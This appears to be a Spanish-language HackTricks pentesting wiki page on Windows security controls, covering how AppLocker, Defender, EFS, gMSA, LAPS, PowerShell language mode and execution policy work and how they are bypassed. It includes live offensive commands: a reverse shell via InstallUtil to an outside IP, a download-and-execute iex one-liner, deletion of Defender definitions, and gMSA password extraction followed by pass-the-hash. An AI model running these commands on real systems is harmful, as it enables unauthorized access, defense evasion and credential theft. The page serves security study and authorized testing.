# Controles de seguridad de Windows

{{#include ../../banners/hacktricks-training.md}}

## Directiva de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que pueden estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno frente a malware dañino y software no aprobado que no se ajuste a las necesidades específicas de negocio de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y permite a los administradores de sistemas controlar **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **control granular** sobre ejecutables, scripts, archivos de Windows Installer, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es habitual que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto se puede evadir**.

### Comprobar

Comprueba qué archivos/extensiones están en las listas negras/blancas:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, lo que permite revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Carpetas con permisos de escritura** útiles para evadir la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas con permisos de escritura** que puedes usar para **evadirla**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Los binarios [**"LOLBAS's"**](https://lolbas-project.github.io/) que suelen ser **confiables** también pueden ser útiles para evadir AppLocker.
- **También se podrían evadir reglas mal escritas**
  - Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: puedes crear una **carpeta llamada `allowed`** en cualquier lugar y se permitirá.
  - Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero se olvidan de las [**otras ubicaciones del ejecutable de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **La aplicación de restricciones a DLL rara vez está habilitada** debido a la carga adicional que puede imponer al sistema y a las pruebas necesarias para garantizar que nada deje de funcionar. Por eso, usar **DLLs como backdoors ayudará a evadir AppLocker**.
- Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar** código de **Powershell** en cualquier proceso y evadir AppLocker. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Almacenamiento de credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están en este archivo; las contraseñas están hasheadas.

### Local Security Authority (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema para permitir el inicio de sesión único.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), la **autenticación**, los **tokens de acceso**...\
LSA será quien **compruebe** las credenciales proporcionadas en el archivo **SAM** (para un inicio de sesión local) y se **comunique** con el **controlador de dominio** para autenticar a un usuario del dominio.

Las **credenciales** se **guardan** en el **proceso LSASS**: tickets de Kerberos, hashes NT y LM, contraseñas fáciles de descifrar.

### LSA secrets

LSA puede guardar algunas credenciales en disco:

- Contraseña de la cuenta de equipo de Active Directory (controlador de dominio inaccesible).
- Contraseñas de las cuentas de los servicios de Windows
- Contraseñas de las tareas programadas
- Más (contraseña de aplicaciones IIS...)

### NTDS.dit

Es la base de datos de Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) es un antivirus disponible en Windows 10 y Windows 11, así como en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de **evadir estas protecciones**.

### Comprobación

Para comprobar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (comprueba el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

También puedes ejecutarlo para enumerarlo:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Sistema de archivos cifrados (EFS)

EFS protege los archivos mediante cifrado, utilizando una **clave simétrica** conocida como **File Encryption Key (FEK)**. Esta clave se cifra con la **clave pública** del usuario y se almacena dentro del **flujo de datos alternativo** $EFS del archivo cifrado. Cuando es necesario descifrar el archivo, se usa la **clave privada** correspondiente al certificado digital del usuario para descifrar la FEK desde el flujo $EFS. Puedes encontrar más detalles [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).

Entre los casos de **descifrado sin intervención del usuario** se incluyen:

- Cuando se mueven archivos o carpetas a un sistema de archivos que no es EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se descifran automáticamente.
- Los archivos cifrados que se envían por la red mediante el protocolo SMB/CIFS se descifran antes de la transmisión.

Este método de cifrado permite al propietario **acceder de forma transparente** a los archivos cifrados. Sin embargo, cambiar simplemente la contraseña del propietario e iniciar sesión no permitirá descifrarlos.

**Conclusiones clave**:

- EFS usa una FEK simétrica, cifrada con la clave pública del usuario.
- El descifrado utiliza la clave privada del usuario para acceder a la FEK.
- El descifrado automático ocurre en condiciones específicas, como al copiar archivos a FAT32 o transmitirlos por la red.
- El propietario puede acceder a los archivos cifrados sin pasos adicionales.

### Comprobar la información de EFS

Comprueba si un **usuario** ha **utilizado** este **servicio** verificando si existe esta ruta:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Comprueba **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puedes usar `cipher /e` y `cipher /d` dentro de una carpeta para **cifrar** y **descifrar** todos los archivos.

### Descifrar archivos EFS

#### Siendo Authority System

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** en el host. Si es así, mediante una sesión de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O simplemente puedes hacer `migrate` al proceso del usuario.

#### Conocer la contraseña del usuario

Mimikatz documenta cómo importar el certificado y el material de clave privada del usuario y descifrar los archivos protegidos con EFS cuando se conoce la contraseña.<sup>[[6]](#references)</sup>

## Cuentas de servicio administradas de grupo (gMSA)

Microsoft desarrolló **Group Managed Service Accounts (gMSA)** para simplificar la administración de cuentas de servicio en infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales, que suelen tener habilitada la opción "**La contraseña nunca expira**", las gMSA ofrecen una solución más segura y fácil de administrar:

- **Administración automática de contraseñas**: las gMSA usan una contraseña compleja de 240 caracteres que cambia automáticamente según la directiva del dominio o del equipo. Este proceso lo gestiona el Key Distribution Service (KDC) de Microsoft, lo que elimina la necesidad de actualizar las contraseñas manualmente.
- **Seguridad mejorada**: estas cuentas no pueden bloquearse ni utilizarse para iniciar sesión de forma interactiva, lo que mejora su seguridad.
- **Compatibilidad con varios hosts**: las gMSA se pueden compartir entre varios hosts, por lo que son ideales para servicios que se ejecutan en varios servidores.
- **Compatibilidad con tareas programadas**: a diferencia de las cuentas de servicio administradas, las gMSA permiten ejecutar tareas programadas.
- **Administración simplificada de SPN**: el sistema actualiza automáticamente el Service Principal Name (SPN) cuando cambian los detalles sAMaccount o el nombre DNS del equipo, lo que simplifica la administración de SPN.

Las contraseñas de las gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y los controladores de dominio (DC) las restablecen automáticamente cada 30 días. Esta contraseña, un blob de datos cifrado conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo pueden recuperarla los administradores autorizados y los servidores donde están instaladas las gMSA, lo que garantiza un entorno seguro. Para acceder a esta información, se requiere una conexión segura, como LDAPS, o que la conexión esté autenticada con 'Sealing & Secure'.

![Retransmitir la autenticación NTLM para recuperar una contraseña de gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Encuentra más información en la investigación original archivada**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

La misma investigación explica cómo un **ataque de relay NTLM** puede obtener una **contraseña de gMSA** cuando el principal retransmitido está autorizado para leer `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Abusar del encadenamiento de ACL para leer la contraseña administrada de gMSA (GenericAll -> ReadGMSAPassword)

En muchos entornos, los usuarios con pocos privilegios pueden acceder a secretos de gMSA sin comprometer el DC, abusando de ACL de objetos mal configuradas:<sup>[[3]](#references)</sup>

- A un grupo que puedes controlar (p. ej., mediante GenericAll/GenericWrite) se le concede `ReadGMSAPassword` sobre una gMSA.
- Al agregarte a ese grupo, heredas el derecho a leer el blob `msDS-ManagedPassword` de la gMSA mediante LDAP y obtener credenciales NTLM utilizables.

Flujo de trabajo habitual:

1) Encuentra la ruta con BloodHound y marca tus principales de foothold como Owned. Busca aristas como:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Agrégate al grupo intermedio que controlas (ejemplo con bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Lee la contraseña administrada de gMSA mediante LDAP y deriva el hash NTLM. NetExec automatiza la extracción de `msDS-ManagedPassword` y su conversión a NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Autentícate como gMSA usando el hash NTLM (no se necesita texto sin cifrar). Si la cuenta está en Remote Management Users, WinRM funcionará directamente:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Notes:
- Las lecturas LDAP de `msDS-ManagedPassword` requieren sealing (p. ej., LDAPS/sign+seal). Las herramientas lo gestionan automáticamente.
- A menudo se conceden a las gMSA derechos locales, como WinRM; valida la pertenencia a grupos (p. ej., Remote Management Users) para planificar el movimiento lateral.
- Si solo necesitas el blob para calcular el NTLM por tu cuenta, consulta la estructura MSDS-MANAGEDPASSWORD_BLOB.

Otra vía mediante ACL es un permiso de escritura en el propio objeto gMSA. `msDS-GroupMSAMembership` es el descriptor de seguridad que se usa para decidir qué principales pueden recuperar la contraseña administrada. Su GUID de esquema es `888eedd6-ce04-df40-b462-b8a50e41ba38`. Una ACE exacta de `WriteProperty` sobre ese atributo para un grupo que controlas puede ser una opción para cambiar la lista de lectores; no es lo mismo que ya figurar como lector. Confirma la DACL completa, las ACE de denegación y heredadas, y los permisos efectivos antes de considerar viable esta vía. Para leer la contraseña, también se necesita actualizar el token o la sesión después de añadir la pertenencia al grupo.<sup>[[7]](#references)</sup>



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponible para descargar desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite gestionar las contraseñas del Administrador local. Estas contraseñas, que son **aleatorias**, únicas y **se cambian periódicamente**, se almacenan de forma centralizada en Active Directory. El acceso a estas contraseñas se restringe mediante ACL a los usuarios autorizados. Si se conceden permisos suficientes, es posible leer las contraseñas de administrador local.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

El [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) de PowerShell **restringe muchas de las funciones** necesarias para usar PowerShell eficazmente, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.

### **Comprobar**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

En las versiones actuales de Windows, ese bypass ya no funciona, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, quizá tengas que** **ir a** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> añadir `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y hacer bypass del modo restringido. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Directiva de ejecución de PS

De forma predeterminada, está establecida en **restringida**. Principales formas de hacer bypass de esta directiva:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Puedes encontrar más [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Interfaz de proveedor de soporte de seguridad (SSPI)

Es una API que se puede usar para autenticar usuarios.

SSPI selecciona un protocolo de autenticación adecuado para dos máquinas que se comunican, y prefiere Kerberos cuando está disponible. Estos protocolos los implementan los proveedores de soporte de seguridad (SSP), que se instalan como DLL en Windows; ambos pares deben admitir el proveedor negociado.

### Principales SSP

- **Kerberos**: El preferido
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** y **NTLMv2**: Por motivos de compatibilidad
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL y TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Se usa para negociar el protocolo que se utilizará (Kerberos o NTLM; Kerberos es el predeterminado)
  - %windir%\Windows\System32\lsasrv.dll

#### La negociación puede ofrecer varios métodos o solo uno.

## UAC - Control de cuentas de usuario

[El Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que habilita un **aviso de consentimiento para actividades con privilegios elevados**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Retransmisión para gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA mediante encadenamiento de permisos para WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Omisión de AppLocker y del modo de lenguaje restringido de PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 formas de omitir la directiva de ejecución de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ descifrar archivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - atributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
